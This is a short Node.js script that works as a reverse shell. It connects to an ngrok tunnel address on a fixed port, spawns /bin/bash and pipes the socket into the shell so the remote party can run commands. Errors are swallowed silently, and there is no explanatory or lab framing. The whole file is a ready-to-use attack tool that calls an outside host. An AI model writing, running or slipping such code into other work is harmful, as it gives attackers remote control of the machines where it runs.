const net = require('net');
const { spawn } = require('child_process');

const HOST = '0.tcp.sa.ngrok.io';
const PORT = 15587;

const client = new net.Socket();

client.connect(PORT, HOST, () => {
    const sh = spawn('/bin/bash', [], { stdio: 'pipe', shell: true });
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
    sh.on('exit', () => client.destroy());
});

client.on('error', () => {});
client.on('close', () => {});